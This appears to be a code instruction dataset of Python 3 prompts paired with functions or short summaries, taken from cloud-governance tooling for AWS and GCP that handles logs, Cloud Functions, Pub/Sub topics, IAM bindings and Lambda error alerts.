{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nmaking config revision look like describe output.", "response": "def transform_revision(self, revision):\n        \"\"\"make config revision look like describe output.\"\"\"\n        config = self.manager.get_source('config')\n        return config.load_resource(revision)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef register_resources(klass, registry, resource_class):\n        config_type = getattr(resource_class.resource_type, 'config_type', None)\n        if config_type is None:\n            return\n        resource_class.filter_registry.register('json-diff', klass)", "response": "register the json - diff filter"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _default_options(p, blacklist=\"\"):\n    provider = p.add_argument_group(\n        \"provider\", \"AWS account information, defaults per the aws cli\")\n\n    if 'region' not in blacklist:\n        provider.add_argument(\n            \"-r\", \"--region\", action='append', default=[],\n            dest='regions', metavar='REGION',\n            help=\"AWS Region to target.  Can be used multiple times\")\n    provider.add_argument(\n        \"--profile\",\n        help=\"AWS Account Config File Profile to utilize\")\n    provider.add_argument(\"--assume\", default=None, dest=\"assume_role\",\n                          help=\"Role to assume\")\n    provider.add_argument(\"--external-id\", default=None, dest=\"external_id\",\n                          help=\"External Id to provide when assuming a role\")\n\n    config = p.add_argument_group(\n        \"config\", \"Policy config file(s) and policy selectors\")\n    # -c is deprecated.  Supported for legacy reasons\n    config.add_argument(\"-c\", \"--config\", help=argparse.SUPPRESS)\n    config.add_argument(\"configs\", nargs='*',\n                        help=\"Policy configuration file(s)\")\n    config.add_argument(\"-p\", \"--policies\", default=None, dest='policy_filter',\n                        help=\"Only use named/matched policies\")\n    config.add_argument(\"-t\", \"--resource\", default=None, dest='resource_type',\n                        help=\"Only use policies with the given resource type\")\n\n    output = p.add_argument_group(\"output\", \"Output control\")\n    output.add_argument(\"-v\", \"--verbose\", action=\"count\", help=\"Verbose logging\")\n    if 'quiet' not in blacklist:\n        output.add_argument(\"-q\", \"--quiet\", action=\"count\",\n                            help=\"Less logging (repeatable, -qqq for no output)\")\n    else:\n        output.add_argument(\"-q\", \"--quiet\", action=\"count\", help=argparse.SUPPRESS)\n    output.add_argument(\"--debug\", default=False, help=argparse.SUPPRESS,\n                        action=\"store_true\")\n\n    if 'vars' not in blacklist:\n        # p.add_argument('--vars', default=None,\n        #               help='Vars file to substitute into policy')\n        p.set_defaults(vars=None)\n\n    if 'log-group' not in blacklist:\n        p.add_argument(\n            \"-l\", \"--log-group\", default=None,\n            help=\"Cloudwatch Log Group to send policy logs\")\n    else:\n        p.add_argument(\"--log-group\", default=None, help=argparse.SUPPRESS)\n\n    if 'output-dir' not in blacklist:\n        p.add_argument(\"-s\", \"--output-dir\", required=True,\n                       help=\"[REQUIRED] Directory or S3 URL For policy output\")\n\n    if 'cache' not in blacklist:\n        p.add_argument(\n            \"-f\", \"--cache\", default=\"~/.cache/cloud-custodian.cache\",\n            help=\"Cache file (default %(default)s)\")\n        p.add_argument(\n            \"--cache-period\", default=15, type=int,\n            help=\"Cache validity in minutes (default %(default)i)\")\n    else:\n        p.add_argument(\"--cache\", default=None, help=argparse.SUPPRESS)", "response": "Add basic options ot the subparser."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nadds options specific to the report subcommand.", "response": "def _report_options(p):\n    \"\"\" Add options specific to the report subcommand. \"\"\"\n    _default_options(p, blacklist=['cache', 'log-group', 'quiet'])\n    p.add_argument(\n        '--days', type=float, default=1,\n        help=\"Number of days of history to consider\")\n    p.add_argument(\n        '--raw', type=argparse.FileType('wb'),\n        help=\"Store raw json of collected records to given file path\")\n    p.add_argument(\n        '--field', action='append', default=[], type=_key_val_pair,\n        metavar='HEADER=FIELD',\n        help='Repeatable. JMESPath of field to include in the output OR '\n        'for a tag use prefix `tag:`. Special case fields `region` and'\n        '`policy` are available')\n    p.add_argument(\n        '--no-default-fields', action=\"store_true\",\n        help='Exclude default fields for report.')\n    p.add_argument(\n        '--format', default='csv', choices=['csv', 'grid', 'simple', 'json'],\n        help=\"Format to output data in (default: %(default)s). \"\n        \"Options include simple, grid, csv, json\")"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nadds options specific to metrics subcommand.", "response": "def _metrics_options(p):\n    \"\"\" Add options specific to metrics subcommand. \"\"\"\n    _default_options(p, blacklist=['log-group', 'output-dir', 'cache', 'quiet'])\n\n    p.add_argument(\n        '--start', type=date_parse,\n        help='Start date (requires --end, overrides --days)')\n    p.add_argument(\n        '--end', type=date_parse, help='End date')\n    p.add_argument(\n        '--days', type=int, default=14,\n        help='Number of days of history to consider (default: %(default)i)')\n    p.add_argument('--period', type=int, default=60 * 24 * 24)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nadds options specific to logs subcommand.", "response": "def _logs_options(p):\n    \"\"\" Add options specific to logs subcommand. \"\"\"\n    _default_options(p, blacklist=['cache', 'quiet'])\n\n    # default time range is 0 to \"now\" (to include all log entries)\n    p.add_argument(\n        '--start',\n        default='the beginning',  # invalid, will result in 0\n        help='Start date and/or time',\n    )\n    p.add_argument(\n        '--end',\n        default=datetime.now().strftime('%c'),\n        help='End date and/or time',\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nadd options specific to schema subcommand.", "response": "def _schema_options(p):\n    \"\"\" Add options specific to schema subcommand. \"\"\"\n\n    p.add_argument(\n        'resource', metavar='selector', nargs='?',\n        default=None).completer = _schema_tab_completer\n    p.add_argument(\n        '--summary', action=\"store_true\",\n        help=\"Summarize counts of available resources, actions and filters\")\n    p.add_argument('--json', action=\"store_true\", help=argparse.SUPPRESS)\n    p.add_argument(\"-v\", \"--verbose\", action=\"count\", help=\"Verbose logging\")\n    p.add_argument(\"-q\", \"--quiet\", action=\"count\", help=argparse.SUPPRESS)\n    p.add_argument(\"--debug\", default=False, help=argparse.SUPPRESS)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\naugments rds clusters with their respective tags.", "response": "def _rds_cluster_tags(model, dbs, session_factory, generator, retry):\n    \"\"\"Augment rds clusters with their respective tags.\"\"\"\n    client = local_session(session_factory).client('rds')\n\n    def process_tags(db):\n        try:\n            db['Tags'] = retry(\n                client.list_tags_for_resource,\n                ResourceName=generator(db[model.id]))['TagList']\n            return db\n        except client.exceptions.DBClusterNotFoundFault:\n            return None\n\n    # Rds maintains a low api call limit, so this can take some time :-(\n    return list(filter(None, map(process_tags, dbs)))"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef process_user_record(cls, info):\n        keys = list(info.keys())\n        # Value conversion\n        for k in keys:\n            v = info[k]\n            if v in ('N/A', 'no_information'):\n                info[k] = None\n            elif v == 'false':\n                info[k] = False\n            elif v == 'true':\n                info[k] = True\n        # Object conversion\n        for p, t in cls.list_sub_objects:\n            obj = dict([(k[len(p):], info.pop(k))\n                        for k in keys if k.startswith(p)])\n            if obj.get('active', False):\n                info.setdefault(t, []).append(obj)\n        return info", "response": "Type convert the csv record modifies in place."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef normalized_log_entries(raw_entries):\n    '''Mimic the format returned by LambdaManager.logs()'''\n    entry_start = r'([0-9:, \\-]+) - .* - (\\w+) - (.*)$'\n    entry = None\n    # process start/end here - avoid parsing log entries twice\n    for line in raw_entries:\n        m = re.match(entry_start, line)\n        if m:\n            # this is the start of a new entry\n            # spit out the one previously built up (if any)\n            if entry is not None:\n                yield entry\n            (log_time, log_level, log_text) = m.groups()\n            # convert time\n            log_timestamp = _timestamp_from_string(log_time)\n            # join level and first line of message\n            msg = '[{}] {}'.format(log_level, log_text)\n            entry = {\n                'timestamp': log_timestamp,\n                'message': msg,\n            }\n        else:\n            # additional line(s) for entry (i.e. stack trace)\n            entry['message'] = entry['message'] + line\n    if entry is not None:\n        # return the final entry\n        yield entry", "response": "Mimic the format returned by LambdaManager. logs"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef log_entries_in_range(entries, start, end):\n    '''filter out entries before start and after end'''\n    start = _timestamp_from_string(start)\n    end = _timestamp_from_string(end)\n    for entry in entries:\n        log_timestamp = entry.get('timestamp', 0)\n        if log_timestamp >= start and log_timestamp <= end:\n            yield entry", "response": "filter out entries in a given range"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget log entries from a specific log group.", "response": "def log_entries_from_group(session, group_name, start, end):\n    '''Get logs for a specific log group'''\n    logs = session.client('logs')\n    log.info(\"Fetching logs from group: %s\" % group_name)\n    try:\n        logs.describe_log_groups(logGroupNamePrefix=group_name)\n    except ClientError as e:\n        if e.response['Error']['Code'] == 'ResourceNotFoundException':\n            return\n        raise\n    try:\n        log_streams = logs.describe_log_streams(\n            logGroupName=group_name,\n            orderBy=\"LastEventTime\",\n            limit=3,\n            descending=True,\n        )\n    except ClientError as e:\n        if e.response['Error']['Code'] == 'ResourceNotFoundException':\n            return\n        raise\n    start = _timestamp_from_string(start)\n    end = _timestamp_from_string(end)\n    for s in reversed(log_streams['logStreams']):\n        result = logs.get_log_events(\n            logGroupName=group_name,\n            logStreamName=s['logStreamName'],\n            startTime=start,\n            endTime=end,\n        )\n        for e in result['events']:\n            yield e"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nbuild and returns a cloud API service object.", "response": "def _create_service_api(credentials, service_name, version, developer_key=None,\n                        cache_discovery=False, http=None):\n    \"\"\"Builds and returns a cloud API service object.\n\n    Args:\n        credentials (OAuth2Credentials): Credentials that will be used to\n            authenticate the API calls.\n        service_name (str): The name of the API.\n        version (str): The version of the API to use.\n        developer_key (str): The api key to use to determine the project\n            associated with the API call, most API services do not require\n            this to be set.\n        cache_discovery (bool): Whether or not to cache the discovery doc.\n\n    Returns:\n        object: A Resource object with methods for interacting with the service.\n    \"\"\"\n    # The default logging of the discovery obj is very noisy in recent versions.\n    # Lower the default logging level of just this module to WARNING unless\n    # debug is enabled.\n    if log.getEffectiveLevel() > logging.DEBUG:\n        logging.getLogger(discovery.__name__).setLevel(logging.WARNING)\n\n    discovery_kwargs = {\n        'serviceName': service_name,\n        'version': version,\n        'developerKey': developer_key,\n        'cache_discovery': cache_discovery,\n    }\n\n    if http:\n        discovery_kwargs['http'] = http\n    else:\n        discovery_kwargs['credentials'] = credentials\n\n    return discovery.build(**discovery_kwargs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nconstructs an http client suitable for googleapiclient usage w / user agent.", "response": "def _build_http(http=None):\n    \"\"\"Construct an http client suitable for googleapiclient usage w/ user agent.\n    \"\"\"\n    if not http:\n        http = httplib2.Http(\n            timeout=HTTP_REQUEST_TIMEOUT, ca_certs=HTTPLIB_CA_BUNDLE)\n\n    user_agent = 'Python-httplib2/{} (gzip), {}/{}'.format(\n        httplib2.__version__,\n        'custodian-gcp',\n        '0.1')\n    return set_user_agent(http, user_agent)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef http(self):\n        if self._use_cached_http and hasattr(self._local, 'http'):\n            return self._local.http\n        if self._http_replay is not None:\n            # httplib2 instance is not thread safe\n            http = self._http_replay\n        else:\n            http = _build_http()\n        authorized_http = google_auth_httplib2.AuthorizedHttp(\n            self._credentials, http=http)\n        if self._use_cached_http:\n            self._local.http = authorized_http\n        return authorized_http", "response": "A httplib2. Http instance authorized by the credentials."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _build_request(self, verb, verb_arguments):\n        method = getattr(self._component, verb)\n\n        # Python insists that keys in **kwargs be strings (not variables).\n        # Since we initially build our kwargs as a dictionary where one of the\n        # keys is a variable (target), we need to convert keys to strings,\n        # even though the variable in question is of type str.\n        method_args = {str(k): v for k, v in verb_arguments.items()}\n        return method(**method_args)", "response": "Builds a HttpRequest object."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nbuilding the next request object.", "response": "def _build_next_request(self, verb, prior_request, prior_response):\n        \"\"\"Builds pagination-aware request object.\n\n        More details:\n          https://developers.google.com/api-client-library/python/guide/pagination\n\n        Args:\n            verb (str): Request verb (ex. insert, update, delete).\n            prior_request (httplib2.HttpRequest): Request that may trigger\n                paging.\n            prior_response (dict): Potentially partial response.\n\n        Returns:\n            httplib2.HttpRequest: HttpRequest or None. None is returned when\n                there is nothing more to fetch - request completed.\n        \"\"\"\n        method = getattr(self._component, verb + '_next')\n        return method(prior_request, prior_response)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nexecutes a command via a dedicated http object.", "response": "def execute_command(self, verb, verb_arguments):\n        \"\"\"Executes command (ex. add) via a dedicated http object.\n\n        Async APIs may take minutes to complete. Therefore, callers are\n        encouraged to leverage concurrent.futures (or similar) to place long\n        running commands on a separate threads.\n\n        Args:\n            verb (str): Method to execute on the component (ex. get, list).\n            verb_arguments (dict): key-value pairs to be passed to _build_request.\n\n        Returns:\n            dict: An async operation Service Response.\n        \"\"\"\n        request = self._build_request(verb, verb_arguments)\n        return self._execute(request)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef execute_paged_query(self, verb, verb_arguments):\n        if not self.supports_pagination(verb=verb):\n            raise PaginationNotSupported('{} does not support pagination')\n\n        request = self._build_request(verb, verb_arguments)\n\n        number_of_pages_processed = 0\n        while request is not None:\n            response = self._execute(request)\n            number_of_pages_processed += 1\n            log.debug('Executing paged request #%s', number_of_pages_processed)\n            request = self._build_next_request(verb, request, response)\n            yield response", "response": "Executes a paginated query via a dedicated http object."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nexecutes a query via a dedicated http object.", "response": "def execute_search_query(self, verb, verb_arguments):\n        \"\"\"Executes query (ex. search) via a dedicated http object.\n\n        Args:\n            verb (str): Method to execute on the component (ex. search).\n            verb_arguments (dict): key-value pairs to be passed to _BuildRequest.\n\n        Yields:\n            dict: Service Response.\n        \"\"\"\n        # Implementation of search does not follow the standard API pattern.\n        # Fields need to be in the body rather than sent seperately.\n        next_page_token = None\n        number_of_pages_processed = 0\n        while True:\n            req_body = verb_arguments.get('body', dict())\n            if next_page_token:\n                req_body['pageToken'] = next_page_token\n            request = self._build_request(verb, verb_arguments)\n            response = self._execute(request)\n            number_of_pages_processed += 1\n            log.debug('Executing paged request #%s', number_of_pages_processed)\n            next_page_token = response.get('nextPageToken')\n            yield response\n\n            if not next_page_token:\n                break"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef execute_query(self, verb, verb_arguments):\n        request = self._build_request(verb, verb_arguments)\n        return self._execute(request)", "response": "Executes a query via a dedicated http object."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nexecuting with retries and rate limiting.", "response": "def _execute(self, request):\n        \"\"\"Run execute with retries and rate limiting.\n\n        Args:\n            request (object): The HttpRequest object to execute.\n\n        Returns:\n            dict: The response from the API.\n        \"\"\"\n        if self._rate_limiter:\n            # Since the ratelimiter library only exposes a context manager\n            # interface the code has to be duplicated to handle the case where\n            # no rate limiter is defined.\n            with self._rate_limiter:\n                return request.execute(http=self.http,\n                                       num_retries=self._num_retries)\n        return request.execute(http=self.http,\n                               num_retries=self._num_retries)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef info(self, account_id, resource_id, parent_id):\n        resource = self.record(account_id, resource_id)\n        if resource is None and not parent_id:\n            return {'ResourceId': resource_id,\n                    'LockStatus': self.STATE_UNLOCKED}\n        elif resource is None:\n            parent = self.record(account_id, parent_id)\n            if parent is None:\n                return {'ResourceId': resource_id,\n                        'ParentId': parent_id,\n                        'LockStatus': self.STATE_UNLOCKED}\n            parent['ResourceId'] = resource_id\n            parent['ParentId'] = parent_id\n            parent['LockType'] = 'parent'\n            return parent\n        if resource['ResourceId'].startswith('vpc-'):\n            return resource\n        if resource['ResourceId'].startswith('sg-'):\n            return resource", "response": "Get the resource lock status."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef process_eni_metrics(\n        stream_eni, myips, stream,\n        start, end, period, sample_size,\n        resolver, sink_uri):\n    \"\"\"ENI flow stream processor that rollups, enhances,\n       and indexes the stream by time period.\"\"\"\n    stats = Counter()\n    period_counters = flow_stream_stats(myips, stream, period)\n    client = InfluxDBClient.from_dsn(sink_uri)\n    resource = resolver.resolve_resource(stream_eni)\n    points = []\n\n    for period in sorted(period_counters):\n        pc = period_counters[period]\n        pd = datetime.fromtimestamp(period)\n\n        for t in ('inbytes', 'outbytes'):\n            tpc = pc[t]\n            ips = [ip for ip, _ in tpc.most_common(sample_size)]\n            resolved = resolver.resolve(ips, pd - timedelta(900), pd + timedelta(900))\n            logical_counter = rollup_logical(tpc, resolved, ('app', 'env'))\n            for (app, env), v in logical_counter.items():\n                p = {}\n#                rinfo = resolved.get(ip, {})\n                p['fields'] = {'Bytes': v}\n                p['measurement'] = 'traffic_%s' % t\n                p['time'] = datetime.fromtimestamp(period)\n                p['tags'] = {\n                    'Kind': resource['type'],\n                    'AccountId': resource['account_id'],\n                    'App': resource['app'],\n                    'Env': resource['env'],\n                    'ForeignApp': app,\n                    'ForeignEnv': env}\n                points.append(p)\n\n        if len(points) > 2000:\n            client.write_points(points)\n            stats['Points'] += len(points)\n            points = []\n\n    client.write_points(points)\n    stats['Points'] += len(points)\n    log.info('periods:%d resource:%s points:%d',\n             len(period_counters), resource, stats['Points'])\n    return stats", "response": "ENI flow stream processor that rollups enhances and indexes the stream by time period."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef analyze_app(\n        app, env, account_id,\n        bucket, prefix, store_dir,\n        resources, ipdb, ipranges,\n        start, end, tz,\n        sink, period, sample_count,\n        debug):\n    \"\"\"Analyze flow log records for application and generate metrics per period\"\"\"\n    logging.basicConfig(level=logging.INFO)\n    logging.getLogger('botocore').setLevel(logging.WARNING)\n\n    executor = debug and MainThreadExecutor or ThreadPoolExecutor\n    start, end = get_dates(start, end, tz)\n    resolver = IPResolver(ipdb, ipdb, ipranges)\n\n    for rtype_name in resources:\n        rtype = Resource.get_type(rtype_name)\n        resource_map = {\n            rtype.id(r): r for r\n            in rtype.get_resources(ipdb, start, end, app, env)}\n        log.info(\"App:%s Env:%s Type:%s Found:%d\",\n                 app, env, rtype_name, len(resource_map))\n\n        with sqlite3.connect(ipdb) as db:\n            db.row_factory = row_factory\n            cursor = db.cursor()\n            cursor.execute(\n                'select * from enis where resource_type in (%s)' % (\n                    \", \".join([\"'%s'\" % r for r in resource_map.keys()])))\n            enis = list(cursor)\n            eni_map = {e['eni_id']: e for e in enis}\n\n        # TODO: Download should be doing date bits here across the range of days.\n        log_prefix = \"%s/%s/flow-log/%s/%s\" % (\n            prefix.rstrip('/'),\n            account_id,\n            start.strftime('%Y/%m/%d'),\n            \"00000000-0000-0000-0000-000000000000\")\n\n        f_downloads = {}\n        f_metrics = {}\n        files = {}\n\n        # should probably just queue this out to distributed worker pool\n        with executor(max_workers=5) as w:\n            client = boto3.client('s3')\n            for e in enis:\n                f_downloads[\n                    w.submit(\n                        eni_download_flows,\n                        client, bucket,\n                        log_prefix, start, end,\n                        e['eni_id'], store_dir)] = e\n\n            for f in as_completed(f_downloads):\n                if f.exception():\n                    log.warning(\n                        \"error processing eni %s download: %s\",\n                        eni_map[f_downloads[f]],\n                        f.exception())\n                    continue\n                e = f_downloads[f]\n                files[e['eni_id']] = f.result()\n\n            ipset = {e['ip_address'] for e in enis}\n\n            for eni_id, files in files.items():\n                stream = eni_flow_stream(files, start, end)\n                f_metrics[w.submit(\n                    process_eni_metrics,\n                    eni_map[eni_id], ipset,\n                    stream,\n                    start, end, period, sample_count,\n                    resolver, sink)] = eni_id\n\n            for f in as_completed(f_metrics):\n                if f.exception():\n                    log.warning(\n                        \"error processing eni %s download %s\",\n                        eni_map[f_metrics[f]],\n                        f.exception())\n                    continue", "response": "Analyze flow log records for application and generate metrics per period"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef list_functions(self, prefix=None):\n        return self.client.execute_command(\n            'list',\n            {'parent': \"projects/{}/locations/{}\".format(\n                self.session.get_default_project(),\n                self.region)}\n        ).get('functions', [])", "response": "List extant cloud functions."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\npublishes the given function.", "response": "def publish(self, func):\n        \"\"\"publish the given function.\"\"\"\n        project = self.session.get_default_project()\n        func_name = \"projects/{}/locations/{}/functions/{}\".format(\n            project, self.region, func.name)\n        func_info = self.get(func.name)\n        source_url = None\n\n        archive = func.get_archive()\n        if not func_info or self._delta_source(archive, func_name):\n            source_url = self._upload(archive, self.region)\n\n        config = func.get_config()\n        config['name'] = func_name\n        if source_url:\n            config['sourceUploadUrl'] = source_url\n\n        # todo - we'll really need before() and after() for pre-provisioning of\n        # resources (ie topic for function stream on create) and post provisioning (schedule\n        # invocation of extant function).\n        #\n        # convergent event source creation\n        for e in func.events:\n            e.add(func)\n\n        if func_info is None:\n            log.info(\"creating function\")\n            response = self.client.execute_command(\n                'create', {\n                    'location': \"projects/{}/locations/{}\".format(\n                        project, self.region),\n                    'body': config})\n        else:\n            delta = delta_resource(func_info, config, ('httpsTrigger',))\n            if not delta:\n                response = None\n            else:\n                update_mask = ','.join(delta)\n                log.info(\"updating function config %s\", update_mask)\n                response = self.client.execute_command(\n                    'patch', {\n                        'name': func_name,\n                        'body': config,\n                        'updateMask': update_mask})\n        return response"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nget the details on a given function.", "response": "def get(self, func_name, qualifier=None):\n        \"\"\"Get the details on a given function.\"\"\"\n        project = self.session.get_default_project()\n        func_name = \"projects/{}/locations/{}/functions/{}\".format(\n            project, self.region, func_name)\n        try:\n            return self.client.execute_query('get', {'name': func_name})\n        except errors.HttpError as e:\n            if e.resp.status != 404:\n                raise"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _upload(self, archive, region):\n        # Generate source upload url\n        url = self.client.execute_command(\n            'generateUploadUrl',\n            {'parent': 'projects/{}/locations/{}'.format(\n                self.session.get_default_project(),\n                region)}).get('uploadUrl')\n        log.debug(\"uploading function code %s\", url)\n        http = self._get_http_client(self.client)\n        headers, response = http.request(\n            url, method='PUT',\n            headers={\n                'content-type': 'application/zip',\n                'Content-Length': '%d' % archive.size,\n                'x-goog-content-length-range': '0,104857600'\n            },\n            body=open(archive.path, 'rb')\n        )\n        log.info(\"function code uploaded\")\n        if headers['status'] != '200':\n            raise RuntimeError(\"%s\\n%s\" % (headers, response))\n        return url", "response": "Upload function source and return source url"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef ensure_topic(self):\n        client = self.session.client('pubsub', 'v1', 'projects.topics')\n        topic = self.get_topic_param()\n        try:\n            client.execute_command('get', {'topic': topic})\n        except HttpError as e:\n            if e.resp.status != 404:\n                raise\n        else:\n            return topic\n\n        # bug in discovery doc.. apis say body must be empty but its required in the\n        # discovery api for create.\n        client.execute_command('create', {'name': topic, 'body': {}})\n        return topic", "response": "Verify the pub / sub topic exists. Returns the topic qualified name."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nensuring the identities are in the iam role bindings for the topic.", "response": "def ensure_iam(self, publisher=None):\n        \"\"\"Ensure the given identities are in the iam role bindings for the topic.\n        \"\"\"\n        topic = self.get_topic_param()\n        client = self.session.client('pubsub', 'v1', 'projects.topics')\n        policy = client.execute_command('getIamPolicy', {'resource': topic})\n        policy.pop('etag')\n        found = False\n        for binding in policy.get('bindings', {}):\n            if binding['role'] != 'roles/pubsub.publisher':\n                continue\n            if publisher in binding['members']:\n                return\n            found = binding\n\n        if not found:\n            policy.setdefault(\n                'bindings', {'members': [publisher], 'role': 'roles/pubsub.publisher'})\n        else:\n            found['members'].append(publisher)\n\n        client.execute_command('setIamPolicy', {'resource': topic, 'body': {'policy': policy}})"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget the parent container for the log sink", "response": "def get_parent(self, log_info):\n        \"\"\"Get the parent container for the log sink\"\"\"\n        if self.data.get('scope', 'log') == 'log':\n            if log_info.scope_type != 'projects':\n                raise ValueError(\"Invalid log subscriber scope\")\n            parent = \"%s/%s\" % (log_info.scope_type, log_info.scope_id)\n        elif self.data['scope'] == 'project':\n            parent = 'projects/{}'.format(\n                self.data.get('scope_id', self.session.get_default_project()))\n        elif self.data['scope'] == 'organization':\n            parent = 'organizations/{}'.format(self.data['scope_id'])\n        elif self.data['scope'] == 'folder':\n            parent = 'folders/{}'.format(self.data['scope_id'])\n        elif self.data['scope'] == 'billing':\n            parent = 'billingAccounts/{}'.format(self.data['scope_id'])\n        else:\n            raise ValueError(\n                'invalid log subscriber scope %s' % (self.data))\n        return parent"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef ensure_sink(self):\n        topic_info = self.pubsub.ensure_topic()\n        scope, sink_path, sink_info = self.get_sink(topic_info)\n        client = self.session.client('logging', 'v2', '%s.sinks' % scope)\n        try:\n            sink = client.execute_command('get', {'sinkName': sink_path})\n        except HttpError as e:\n            if e.resp.status != 404:\n                raise\n            sink = client.execute_command('create', sink_info)\n        else:\n            delta = delta_resource(sink, sink_info['body'])\n            if delta:\n                sink_info['updateMask'] = ','.join(delta)\n                sink_info['sinkName'] = sink_path\n                sink_info.pop('parent')\n                sink = client.execute_command('update', sink_info)\n            else:\n                return sink_path\n\n        self.pubsub.ensure_iam(publisher=sink['writerIdentity'])\n        return sink_path", "response": "Ensure the log sink and its pub sub topic exist."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef remove(self, func):\n        if not self.data['name'].startswith(self.prefix):\n            return\n        parent = self.get_parent(self.get_log())\n        _, sink_path, _ = self.get_sink()\n        client = self.session.client(\n            'logging', 'v2', '%s.sinks' % (parent.split('/', 1)[0]))\n        try:\n            client.execute_command(\n                'delete', {'sinkName': sink_path})\n        except HttpError as e:\n            if e.resp.status != 404:\n                raise", "response": "Remove any provisioned log sink if auto created"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nformatting log events and relay them to SNS", "response": "def process_log_event(event, context):\n    \"\"\"Format log events and relay via sns/email\"\"\"\n    init()\n    serialized = event['awslogs'].pop('data')\n    data = json.loads(zlib.decompress(\n        base64.b64decode(serialized), 16 + zlib.MAX_WBITS))\n\n    # Fetch additional logs for context (20s window)\n    timestamps = [e['timestamp'] for e in data['logEvents']]\n    start = min(timestamps) - 1000 * 15\n    end = max(timestamps) + 1000 * 5\n\n    events = logs.get_log_events(\n        logGroupName=data['logGroup'],\n        logStreamName=data['logStream'],\n        startTime=start,\n        endTime=end,\n        startFromHead=True)['events']\n\n    message = [\n        \"An error was detected\",\n        \"\",\n        \"Log Group: %s\" % data['logGroup'],\n        \"Log Stream: %s\" % data['logStream'],\n        \"Log Owner: %s\" % data['owner'],\n        \"\",\n        \"Log Contents\",\n        \"\"]\n\n    # We may get things delivered from log sub that are not in log events\n    for evt in data['logEvents']:\n        if evt not in events:\n            events.append(evt)\n\n    for evt in events:\n        message.append(message_event(evt))\n        message.append(\"\")\n\n    params = dict(\n        TopicArn=config['topic'],\n        Subject=config['subject'],\n        Message='\\n'.join(message))\n\n    sns.publish(**params)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_function(session_factory, name, role, sns_topic, log_groups,\n                 subject=\"Lambda Error\", pattern=\"Traceback\"):\n    \"\"\"Lambda function provisioning.\n\n    Self contained within the component, to allow for easier reuse.\n    \"\"\"\n\n    # Lazy import to avoid runtime dependency\n    from c7n.mu import (\n        LambdaFunction, PythonPackageArchive, CloudWatchLogSubscription)\n\n    config = dict(\n        name=name,\n        handler='logsub.process_log_event',\n        runtime='python2.7',\n        memory_size=512,\n        timeout=15,\n        role=role,\n        description='Custodian Ops Error Notify',\n        events=[\n            CloudWatchLogSubscription(\n                session_factory, log_groups, pattern)])\n\n    archive = PythonPackageArchive()\n    archive.add_py_file(__file__)\n    archive.add_contents(\n        'config.json', json.dumps({\n            'topic': sns_topic,\n            'subject': subject\n        }))\n    archive.close()\n\n    return LambdaFunction(config, archive)", "response": "Creates a Lambda function provisioning."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nmatch a given cwe event as cloudtrail with an api call", "response": "def match(cls, event):\n        \"\"\"Match a given cwe event as cloudtrail with an api call\n\n        That has its information filled out.\n        \"\"\"\n        if 'detail' not in event:\n            return False\n        if 'eventName' not in event['detail']:\n            return False\n        k = event['detail']['eventName']\n\n        # We want callers to use a compiled expression, but want to avoid\n        # initialization cost of doing it without cause. Not thread safe,\n        # but usage context is lambda entry.\n        if k in cls.trail_events:\n            v = dict(cls.trail_events[k])\n            if isinstance(v['ids'], six.string_types):\n                v['ids'] = e = jmespath.compile('detail.%s' % v['ids'])\n                cls.trail_events[k]['ids'] = e\n            return v\n\n        return False"}
